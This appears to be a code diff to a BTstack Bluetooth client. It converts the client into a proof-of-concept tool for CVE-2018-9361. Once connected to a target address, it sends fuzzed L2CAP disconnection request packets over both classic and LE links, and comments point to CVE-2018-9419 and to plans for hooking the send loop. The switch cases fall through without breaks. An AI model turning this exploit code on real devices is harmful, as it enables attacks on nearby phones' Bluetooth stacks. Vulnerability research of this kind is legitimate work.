@@ -70,8 +70,8 @@ static void handle_hci_event_packet(uint8_t packet_type, uint16_t l2cap_cid, uin
             break;
         case L2CAP_EVENT_CAN_SEND_NOW:
             // handle L2CAP data packet
-            l2cap_reserve_packet_buffer();
-            uint8_t *buffer = l2cap_get_outgoing_buffer();
+            //l2cap_reserve_packet_buffer();
+            //uint8_t *buffer = l2cap_get_outgoing_buffer();
 
             // cve-2018-9419 - info leak via ble?
 
@@ -119,7 +119,9 @@ static void l2cap_packet_handler(uint8_t packet_type, uint16_t l2cap_cid, uint8_
 }
 
 static void do_l2cap_connect(int psm) {
-    uint8_t status = l2cap_create_channel(l2cap_packet_handler, remote_addr, psm, l2cap_max_mtu(), NULL);
+    uint8_t status;
+    //status = l2cap_create_channel(l2cap_packet_handler, remote_addr, psm, l2cap_max_mtu(), NULL);
+    status = gap_connect(remote_addr, 0);
     printf("Status: %d\n", status);
 }
 
@@ -137,26 +139,43 @@ static void packet_handler (uint8_t packet_type, uint16_t channel, uint8_t *pack
     if (packet_type != HCI_EVENT_PACKET) return;
     uint8_t event = hci_event_packet_get_type(packet);
 
+    uint16_t handle;
     switch (event) {
         case BTSTACK_EVENT_STATE:
             // BTstack activated, get started 
             if (btstack_event_state_get_state(packet) == HCI_STATE_WORKING){
-                // do_l2cap_connect(0x1);
-                uint8_t *buffer = l2cap_get_outgoing_buffer();
-                l2cap_send_signaling_packet( buffer, DISCONNECTION_REQUEST,
-                    l2cap_next_sig_id(), 0, 0);   
+                // Not fully needed for CVE-2018-9361, we just need to get a connection started
+                // TODO: Pull out the nessesary HCI commands that get run for creating a connection
+                // and create a method to just trigger a HCI_EVENT_CONNECTION_COMPLETE
+                // l2cap.c:l2cap_create_channel_entry -> hci_send_cmd(&hci_create_connection, channel->address, hci_usable_acl_packet_types(), 0, 0, 0, 1)
+                // Need to hook into l2cap send loop
+                // CVE-2018-9361
+                // do_l2cap_connect(BLUETOOTH_PROTOCOL_SDP);
+
+                do_l2cap_connect(BLUETOOTH_PROTOCOL_AVCTP);
             }
             break;
+        case HCI_EVENT_CONNECTION_COMPLETE:
+            handle = hci_event_connection_complete_get_connection_handle(packet);
+            printf("Connection complete (handle: %d)\n", handle);
+            // CVE-2018-9361
+            l2cap_send_signaling_packet( handle, DISCONNECTION_REQUEST_FUZZ,
+                l2cap_next_sig_id());
+        case HCI_EVENT_LE_META:
+            handle = hci_subevent_le_connection_complete_get_connection_handle(packet);
+            l2cap_send_le_signaling_packet( handle, DISCONNECTION_REQUEST_FUZZ,
+                l2cap_next_sig_id(), 0xde, 0xfe);
         default:
-            // printf("packet_handler: 0x%x\n", event);
+            printf("packet_handler: 0x%x\n", event);
             break;
     }
 }
 
-int btstack_main(int argc, const char * argv[]);
-int btstack_main(int argc, const char * argv[]){
+int btstack_main(int argc, const char * argv[], bd_addr_t addr);
+int btstack_main(int argc, const char * argv[], bd_addr_t addr){
     (void)argc;
     (void)argv;
+    memcpy(remote_addr, addr, sizeof(bd_addr_t));
     
     printf("Client HCI init done\r\n");
     
